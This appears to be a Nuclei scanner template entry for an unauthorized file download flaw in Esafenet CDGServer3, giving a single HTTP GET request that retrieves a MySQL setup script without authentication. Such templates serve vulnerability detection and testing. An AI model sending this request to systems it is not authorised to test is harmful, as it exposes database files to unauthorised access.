# Nuclei Template: Esafenet CDG mysql - File Read
**Template ID:** esafenet-mysql-fileread
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`esafenet-mysql-fileread.yaml`)

## Vulnerability Information & PoC

## Description
CDGServer3 Unauthorized File Download vulnerability is detected.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/CDGServer3/SQL/MYSQL/create_SmartSec_mysql.sql
```

